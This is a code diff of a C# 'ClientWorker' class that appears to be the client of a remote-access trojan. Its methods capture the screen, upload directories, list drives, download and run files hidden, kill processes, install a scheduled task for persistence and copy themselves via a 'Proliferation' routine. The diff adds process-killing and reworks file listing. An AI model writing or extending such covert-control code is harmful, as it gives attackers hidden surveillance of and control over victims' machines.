@@ -20,40 +20,23 @@ namespace ClientWorker
         {
             return "TestFunc Compleate";
         }
-
         public void UploadDirectory(string dirPath, string uploadPath)
         {
             FileManager.UploadDirectory(dirPath, uploadPath);
         }
-
-        public string[] GetDirectoryFiles(string path,string searchPattern)
+        public IDirectoryInfo GetDirectoryFiles(string path,string searchPattern)
         {
-            List<string> dirs = new List<string>();
+            IDirectoryInfo directoryInfo = new IDirectoryInfo();
             foreach (string s in Directory.GetDirectories(path, searchPattern))
-                dirs.Add(s);
+                directoryInfo.Directories.Add(s);
             foreach (string s in Directory.GetFiles(path, searchPattern))
             {
                 FileInfo fInfo = new FileInfo(s);
-
-                dirs.Add(fInfo.Name + " " + GetSize(fInfo.Length));
+                directoryInfo.FilesInfo.Add(fInfo);
             }
 
-            return dirs.ToArray();
+            return directoryInfo;
         }
-        private string GetSize(long byteCount)
-        {
-            string[] suf = { "B", "KB", "MB", "GB", "TB", "PB", "EB" };
-            if (byteCount == 0)
-            {
-                return "0" + suf[0];
-            }
-            long bytes = Math.Abs(byteCount);
-            int place = Convert.ToInt32(Math.Floor(Math.Log(bytes, 1024)));
-            double num = Math.Round(bytes / Math.Pow(1024, place), 1);
-            return (Math.Sign(byteCount) * num).ToString() + suf[place];
-        }
-
-
         public List<string> GetDrives()
         {
             List<string> result = new List<string>();
@@ -64,7 +47,6 @@ namespace ClientWorker
             }
             return result;
         }
-
         public string GetKey()
         {
             return Service.Properties.Settings.Default.Key;
@@ -90,7 +72,6 @@ namespace ClientWorker
         {
             return SendLogList();
         }
-
         public IInfoDevice GetInfoDevice()
         {
             InfoDevice infoDevice = new InfoDevice();
@@ -98,7 +79,6 @@ namespace ClientWorker
             t = infoDevice.AskedInfoDevice();
             return t;
         }
-
         public Bitmap ScreenShot()
         {
             Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
@@ -106,17 +86,14 @@ namespace ClientWorker
             GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
             return BM;
         }
-
         public void DownloadFloader(string ftpPath, string localPath)
         {
             FileManager.DownloadFloader(ftpPath, localPath);
         }
-
         public void DownloadUpdate()
         {
             GetUpd();
         }
-
         public void RunHideProgram(string file)
         {
             FileManager.RunHideProc(file);
@@ -125,16 +102,21 @@ namespace ClientWorker
         {
             FileManager.DownloadFileAndRun(file);
         }
-
         public void Reconnect()
         {
             //Program.netSender.ReConnect();
             throw new Exception("Не реализовано");
         }
-
         public void DeleteFile(string file)
         {
             FileManager.DeleteFile(file);
+        }
+        public void KillProcess(string procName)
+        {
+            foreach (Process process in Process.GetProcessesByName(procName))
+            {
+                process.Kill();
+            }
         }
         public ISetting GetSetting()
         {
@@ -150,7 +132,6 @@ namespace ClientWorker
 
             return setting;
         }
-
         public void GetUpd()
         {
             string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -158,7 +139,6 @@ namespace ClientWorker
                 FtpClient.DownloadF(StartData.updater, folderPath + StartData.floaderNewCopy);
                 FileManager.RunHideProc(folderPath + StartData.floaderNewCopy + StartData.updater);              
         }
-
         private void KillUpdater()
         {
             try
@@ -178,7 +158,6 @@ namespace ClientWorker
                 Log.Send("Не удалось удалить Updater: "+ex.Message);
             }
         }
-
         private List<string> SendLogList()
         {
             List<string> message = new List<string>();
@@ -188,7 +167,6 @@ namespace ClientWorker
             }
             return message;
         }
-
         public static void Registration()
         {
             Log.Send("Registration()");
@@ -196,7 +174,6 @@ namespace ClientWorker
             CreateTask(folderPath + StartData.floaderNewCopy);
             Proliferation(folderPath);
         }
-
         public static void Proliferation(string parth)
         {
             Log.Send("Proliferation()");
@@ -215,7 +192,6 @@ namespace ClientWorker
                 Log.Send("Ошибка копирования :" + ex.Message);
             }
         }
-
         public static void CreateTask(string fileParth)
         {
             new Process
